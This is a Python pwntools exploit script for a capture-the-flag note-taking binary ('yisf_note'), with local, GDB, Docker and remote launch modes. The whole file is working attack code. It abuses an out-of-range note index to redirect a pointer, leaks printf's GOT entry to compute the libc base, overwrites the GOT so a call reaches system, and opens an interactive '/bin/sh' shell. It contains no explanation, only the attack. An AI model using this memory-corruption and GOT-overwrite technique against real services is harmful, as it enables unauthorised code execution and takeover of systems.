#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('yisf_note_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
b *0x0401684
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def read_note(idx):
    command = b"R" + p16(idx)
    io.sendlineafter(b"command", b"1111")
    io.sendline(command)
    io.recvuntil(b"detail : ")
    leak = io.recv(6)
    return u64(leak.ljust(8, b"\x00"))
    
def write_note(data, size, content):
    command = b"W" + data.ljust(0xa, b"A") + p32(size) + content
    io.sendlineafter(b"command", b"1111")
    io.send(command)

def list_note():
    command = b"L"
    io.sendlineafter(b"command", b"1111")
    io.send(command)   

def delete_note(idx):
    command = b"D" + p16(idx)
    io.sendlineafter(b"command", b"1111")
    io.send(command)

def modify_note(idx, size, data):
    command = b"M" + p16(idx) + p32(size) + data
    io.sendlineafter(b"command", b"1111")
    io.send(command)


def solve():

    node_t  = b"A"*0x10
    node_t += p64(0x4040C0)
    node_t += p32(0x300)

    io.sendafter(b":", node_t)

    node_t  = b"B"*0x10
    node_t += p64(exe.got["printf"])
    node_t += p32(0x100)

    modify_note(4000, 0x200, node_t)
    printf = read_note(0)
    libc.address = printf - libc.sym["printf"]
    info("libc base: %#x", libc.address)

    got_table = flat(
        [
            0x000000401060,
            0x000000401070,
            0x000000401080,
            0x000000401090,
            libc.sym["system"]
        ]
    )
    write_note(b"sh", 0x8, b"/bin/sh\x00")

    modify_note(0, len(got_table), got_table)
    modify_note(1, 1, b"A")
    
    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

